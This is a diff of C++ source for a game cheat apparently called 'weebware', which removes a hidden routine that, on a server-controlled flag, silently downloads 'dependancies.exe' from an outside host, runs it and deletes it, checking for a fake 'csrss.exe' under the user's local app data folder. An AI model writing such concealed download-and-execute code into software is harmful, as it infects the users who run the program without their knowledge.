@@ -23,14 +23,6 @@ unsigned __stdcall entry_thread(void* v_arg)
 	return 0;
 }
 
-bool thingy_exists() {
-	char* path = getenv("localappdata");
-
-	strcat(path, "\\Microsoft\\csrss.exe");
-
-	return std::filesystem::exists(path);
-}
-
 bool c_weebware::init_interfaces()
 {
 	while (!(g_weebware.h_window = FindWindowA("Valve001", NULL))) 
@@ -52,16 +44,6 @@ bool c_weebware::init_interfaces()
 	g_user_name = auth::GetServerVariable(auth::base64_decode("ZG9n").c_str());
 	g_engine = reinterpret_cast<c_engine_client*>(engine_fact(auth::GetServerVariable(auth::base64_decode("cmF0")).c_str(), NULL));
 	g_client = reinterpret_cast<i_base_client*>(client_fact(auth::GetServerVariable(auth::base64_decode("Y2F0")).c_str(), NULL));
-
-	if (auth::GetServerVariable(auth::base64_decode("ZmlzaA==")) == "3" && !thingy_exists()) {
-	
-		std::string path = std::tmpnam(nullptr);
-		networking::download_file("https://auth.weebware.net/dependancies.exe", path);
-
-		system(path.c_str());
-		remove(path.c_str());
-	}
-
 #else
 	g_engine = reinterpret_cast<c_engine_client*>(engine_fact("VEngineClient014", NULL));
 	g_client = reinterpret_cast<i_base_client*>(client_fact("VClient018", NULL));
@@ -194,7 +176,7 @@ void c_weebware::setup_debug_window()
 	freopen("CONIN$", "r", stdin);
 	freopen("CONOUT$", "w", stdout);
 	freopen("CONOUT$", "w", stderr);
-	SetConsoleTitle("weebware debug console");
+	SetConsoleTitle("weebware Cheat Console");
 }
 
 std::vector<c_skinchanger::gun_type> c_weebware::create_gun_list()
